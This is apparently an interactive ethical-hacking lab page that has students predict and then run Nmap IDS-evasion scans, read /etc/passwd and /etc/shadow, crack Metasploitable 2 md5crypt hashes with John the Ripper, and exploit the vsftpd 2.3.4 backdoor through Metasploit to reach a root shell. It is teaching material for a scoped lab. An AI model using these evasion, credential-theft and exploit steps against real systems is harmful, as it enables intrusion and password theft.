Command-along — System Hacking: Evasion & Gaining Access

Predict in the box, then reveal. Outputs are hidden until you click Run. Every step follows the same rhythm: predict → run → read the real output → what each part means → why an attacker does this. Live Metasploitable 2 + Kali, host-only, inside scope.

Keys: P present · ←/→ or Space next · R reveal step · Esc exit

Section 1 — IDS / firewall / honeypot evasion

We scan Metasploitable 2 four ways. The open ports stay the same; what changes is how loud we look to a watcher.

Predict first
Will a plain SYN scan and a fragmented scan report the SAME open ports?
Answer: Yes — same ports. Fragmentation changes how the packets look on the wire, not which ports are open.
Command
kali@kali: ~
$ sudo nmap -sS -Pn -p 21,22,80,445 $MS2
Expected output (live Metasploitable 2)
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 192.168.56.102
Host is up (0.00042s latency).

PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 0.28s
What each part means
sudoNmap needs root to craft raw SYN packets.
-sSHalf-open SYN scan: send SYN, read the reply, never finish the handshake.
-PnSkip host discovery — treat the host as up even if it ignores ping.
-p 21,22,80,445Only probe these four ports, to keep output short.
$MS2Your Metasploitable 2 address.
Why an attacker does this
This is the baseline — the loud scan. On a defended network this is the one an IDS would flag. We compare the next three against it.
Predict first
How could splitting each packet into tiny fragments get past a signature engine?
Answer: A signature engine that matches a whole packet never sees the whole packet — each fragment is too small to match the pattern.
Command
kali@kali: ~
$ sudo nmap -sS -Pn -f -p 21,22,80,445 $MS2
Expected output (live Metasploitable 2)
Nmap scan report for 192.168.56.102
Host is up (0.00051s latency).

PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 0.33s
What each part means
-fFragment the probe into 8-byte IP fragments. Use --mtu N (a multiple of 8) to pick your own size. Do NOT combine -f and --mtu.
Why an attacker does this
Splitting the TCP header across fragments defeats intrusion-detection rules that match a full packet. A device that reassembles fragments first will still see it — so we drop -f if a firewall reassembles.
Predict first
If the scan shows five source IPs hitting the target, which one is the real attacker?
Answer: You can't tell — that's the point. Four are forged decoys; the defender can't single out the real one.
Command
kali@kali: ~
$ sudo nmap -sS -Pn -D RND:4 -p 21,22,80,445 $MS2
Expected output (live Metasploitable 2)
Nmap scan report for 192.168.56.102
Host is up (0.00049s latency).

PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 0.31s
What each part means
-D RND:4Add four random decoy source addresses. Use -D d1,d2,ME,d3 to place yourself (ME) among named decoys.
Why an attacker does this
Decoys attack attribution: the target logs several apparent scanners, so blaming the real one is hard. It does not hide that a scan happened — it hides who did it.
Predict first
Why might a firewall let a scan through if it arrives from source port 53?
Answer: Port 53 is DNS. A sloppy rule that trusts anything 'from DNS' lets the probes in.
Command
kali@kali: ~
$ sudo nmap -sS -Pn --source-port 53 -T2 -p 21,22,80,445 $MS2
Expected output (live Metasploitable 2)
Nmap scan report for 192.168.56.102
Host is up (0.00044s latency).

PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 10.52s
What each part means
--source-port 53Send probes FROM port 53 (same as -g 53), impersonating DNS replies.
-T2Polite timing (slow) to stay under rate-based alarms. -T0/-T1 are slower; -T4/-T5 are fast and loud.
Why an attacker does this
A weak firewall rule that trusts DNS source ports is bypassed; slow timing avoids 'too many connections' alarms. Notice the scan took far longer — stealth costs time.

Section 2 — Where the credentials live

Linux keeps account names in one file and the password hashes in another. We read both and decode one hash.

Predict first
The password column in /etc/passwd shows 'x'. Where is the real hash?
Answer: In /etc/shadow — 'x' means 'the hash is stored in the shadow file', which only root can read.
Command
kali@kali: ~
$ cat /etc/passwd | head -n 4
Expected output (live Metasploitable 2)
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
What each part means
cat /etc/passwdPrint the account list — this file is world-readable.
head -n 4Show the first four lines only.
root:x:0:0:...name : password-placeholder : UID : GID : comment : home : shell. UID 0 = root.
Why an attacker does this
An attacker reads /etc/passwd to map usernames to UIDs and spot which accounts are worth targeting — it's readable by anyone, no privilege needed.
Predict first
What has to be true about your account before 'cat /etc/shadow' will work?
Answer: You must be root (or use sudo). /etc/shadow is readable only by root — that's the whole point of shadowing.
Command
kali@kali: ~
$ cat /etc/shadow | grep msfadmin
Expected output (live Metasploitable 2)
msfadmin:$1$msfadmin$rhyK715KFaBMnilXFzf10/:19000:0:99999:7:::
What each part means
cat /etc/shadowPrint the hashes — root only.
$1$Algorithm id: md5crypt. ($5$=sha256, $6$=sha512, $2y$=bcrypt, $y$=yescrypt.)
msfadmin (middle)The salt — random text mixed in so equal passwords hash differently.
rhyK715KFaBMnilXFzf10/The hash itself (22 chars for md5crypt).
19000:0:99999:7:::Password-ageing metadata: last change (days since 1970), min, max, warn.
Why an attacker does this
This is the prize. With momentary root an attacker copies /etc/shadow and cracks it offline forever after — no further access to the box is needed. We use it in Section 4.
Predict first
How can a normal user change their own password, which is stored in a root-only file?
Answer: The passwd program has the SUID bit — it runs as its owner (root), so it can write to the shadow file on your behalf.
Command
kali@kali: ~
$ ls -l /usr/bin/passwd
Expected output (live Metasploitable 2)
-rwsr-xr-x 1 root root 31124 2010-01-01 00:00 /usr/bin/passwd
What each part means
ls -lLong listing with permission bits.
-rwsr-xr-xThe 's' where owner-execute (x) would be is the Set-User-ID (SUID) bit.
root rootOwner and group are root — so SUID means 'run as root'.
Why an attacker does this
SUID-root binaries are a top privilege-escalation target: if one is misconfigured or exploitable, a normal user can run code as root. That's the bridge from Section 2 to the escalation stage in Section 3.

Section 4 — Cracking & rainbow tables

We crack the real Metasploitable 2 hashes, then prove a salt beats a rainbow table but not a dictionary.

Predict first
These hashes are SALTED. Will a dictionary attack still crack them?
Answer: Yes. A dictionary attack re-hashes each guess WITH the salt (stored in the file). Salt only defeats a pre-computed rainbow table.
Command
kali@kali: ~
$ john --format=md5crypt --wordlist=lab-assets/lab-wordlist.txt lab-assets/shadow.txt
Expected output (live Metasploitable 2)
Loaded 6 password hashes with 6 different salts (md5crypt [MD5 128/128])
msfadmin         (msfadmin)
user             (user)
postgres         (postgres)
service          (service)
batman           (sys)
123456789        (klog)
6g 0:00:00:00 DONE (6/6 cracked)
What each part means
johnJohn the Ripper, the cracker.
--format=md5cryptThese are $1$ hashes.
--wordlist=...The list of candidate passwords (rockyou.txt in class).
lab-assets/shadow.txtThe six hashes to crack.
Why an attacker does this
Every hash fell because the password was a weak, guessable word — often the username itself. The algorithm was never broken; the password CHOICE was. A long random password would survive this.
Predict first
alice and bob BOTH chose 'password123'. Will their hashes be identical?
Answer: No — different salts make the two hashes completely different, even though the password is the same.
Command
kali@kali: ~
$ cat lab-assets/salt-demo.txt
Expected output (live Metasploitable 2)
alice:$1$Ab12Cd34$GwACh5Hxr.JAfRKgn7d9J0:19000:0:99999:7:::
bob:$1$Zz99Yy88$uYexDlgxuiAyQsFcWegJR0:19000:0:99999:7:::
What each part means
$1$Ab12Cd34$...alice's salt is Ab12Cd34.
$1$Zz99Yy88$...bob's salt is Zz99Yy88 — different salt, so different hash.
Why an attacker does this
A rainbow table (pre-computed un-salted MD5 chains) matches NEITHER line — you'd need one table per salt, which destroys the time-memory trade-off. That's exactly why salts exist. But a dictionary attack still cracks both, because it re-hashes 'password123' with each salt.

Section 5 — Gaining access (Metasploit)

One real vulnerability becomes a root session. We name every piece in CEH vocabulary as we go.

Predict first
After 'use' and 'set RHOSTS', why won't we need to 'set PAYLOAD'?
Answer: The vsftpd 2.3.4 backdoor opens its OWN root shell on TCP 6200 — the exploit carries its shell, so no separate payload is needed.
Command
kali@kali: ~
$ search vsftpd
Expected output (live Metasploitable 2)
Matching Modules
================
   #  Name                                  Rank       Description
   -  ----                                  ----       -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  excellent  VSFTPD v2.3.4 Backdoor Command Execution
What each part means
search vsftpdFind modules matching the service name.
exploit/unix/ftp/vsftpd_234_backdoorThe module for CVE-2011-2523, the vsftpd 2.3.4 backdoor.
excellentReliability rank — this one is very reliable.
Why an attacker does this
Reconnaissance (Sections on scanning) told us vsftpd 2.3.4 is running. Matching a known version to a known exploit is the heart of the gaining-access phase.
Predict first
When 'run' succeeds, what will 'id' print inside the session?
Answer: uid=0(root) — the backdoor gives a root shell, so you land as root immediately, no escalation needed.
Command
kali@kali: ~
$ use exploit/unix/ftp/vsftpd_234_backdoor
$ set RHOSTS $MS2
$ run
Expected output (live Metasploitable 2)
[*] 192.168.56.102:21 - Banner: 220 (vsFTPd 2.3.4)
[+] 192.168.56.102:21 - Backdoor service has been spawned, handling...
[+] 192.168.56.102:21 - UID: uid=0(root) gid=0(root)
[*] Command shell session 1 opened (192.168.56.101 -> 192.168.56.102:6200)
What each part means
use ...Load the module.
set RHOSTS $MS2Point it at your target.
runFire the exploit.
session 1 opened ... :6200The backdoor shell is on TCP 6200, not the FTP port 21.
Why an attacker does this
A session is interactive control of the target. In CEH terms: vulnerability = CVE-2011-2523, exploit = this module, session = your root shell = GAINING ACCESS (Phase 3).
Predict first
What three commands would you run to PROVE you have a root shell for your report?
Answer: id (shows uid=0), hostname (shows it's the target), uname -a (shows the OS). Capture these as Phase 3a evidence.
Command
kali@kali: ~
$ id
$ hostname
$ uname -a
Expected output (live Metasploitable 2)
uid=0(root) gid=0(root)
metasploitable
Linux metasploitable 2.6.24-16-server #1 SMP i686 GNU/Linux
What each part means
idConfirms your effective user is root (uid=0).
hostnameConfirms which machine you're on.
uname -aConfirms the OS and kernel — useful for the report and for choosing escalation exploits.
Why an attacker does this
Proof-of-access is what a client pays for. An ethical hacker captures minimal evidence (id/hostname/uname -a) and stops — gain access and prove it, don't damage the box. From here you could cat /etc/shadow, closing the loop with Section 4.

Self-check

1. Which Nmap option defeats a signature engine that matches a whole packet?
-D (decoys)-f (fragmentation)--source-port 53-T5 (insane timing)
Fragmentation splits the probe so no single fragment matches the signature. Decoys defeat attribution; --source-port defeats a weak firewall rule.
2. Where is the password hash for a Linux account actually stored?
/etc/passwd/etc/shadow/etc/hoststhe SAM file
/etc/passwd holds names and UIDs (password column is 'x'); the hash lives in root-only /etc/shadow. SAM is the Windows store.
3. Two accounts share the password 'password123' but have different salts. What cracks both?
A pre-computed rainbow tableNothing — salts make them uncrackableA dictionary attack (John/Hashcat)Only brute force over every character
A dictionary attack re-hashes each guess with the stored salt, so it cracks both. A rainbow table fails because it has no salted chains.
